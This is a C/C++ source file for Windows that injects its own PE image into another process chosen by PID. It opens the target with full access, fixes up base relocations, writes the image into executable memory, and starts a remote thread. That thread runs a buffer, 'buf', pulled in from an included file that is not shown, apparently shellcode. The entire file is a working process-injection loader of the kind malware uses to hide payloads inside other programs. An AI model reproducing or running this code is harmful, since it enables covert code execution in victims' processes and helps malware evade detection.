#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#include "base.cpp"

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD EntryPoint() {
    (*(void(*)())(&buf))();
    return 0;
}

int main(int argc, char* argv[]) {
    // Stub variables are declared to hold necessary values.
    DWORD relocationEntriesCount = 0;
    PDWORD_PTR patchedAddress;
    PBASE_RELOCATION_ENTRY relocationRVA = NULL;

    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    // The provided PID argument is parsed from the command-line arguments.
    DWORD pid = strtol(argv[1], NULL, 10);
    if (pid == 0) return 1;

    // The current image's base address is obtained.
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    // A new memory block is allocated sized for the PE image.
    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    if (localImage == NULL) return 1;

    // The PE image is copied into the allocated memory block.
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    // The target process is opened to inject the PE into it.
    HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (targetProcess == NULL) return 1;

    // A new memory block is allocated in the target process. This will be where the PE is injected.
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (targetImage == NULL) return 1;

    // The delta between the base addresses of the current image and the target image is calculated.
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    // The local image is relocated to ensure it will have the correct addresses in the target process.
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    // The relocations are calculated.
    while (relocationTable->SizeOfBlock > 0) {
        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (unsigned i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                // Each relocated address is patched with the calculated delta.
                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        // The next relocation block is processed.
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

    // The relocated local image is written into the target process's memory.
    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) return 1;
    
    // A remote thread is created to start the injected PE in the target process.
    if (CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)EntryPoint + deltaImageBase), NULL, 0, NULL) == NULL) return 1;

    // The handle to the target process is closed after injection is complete.
    CloseHandle(targetProcess);

    return 0;
}
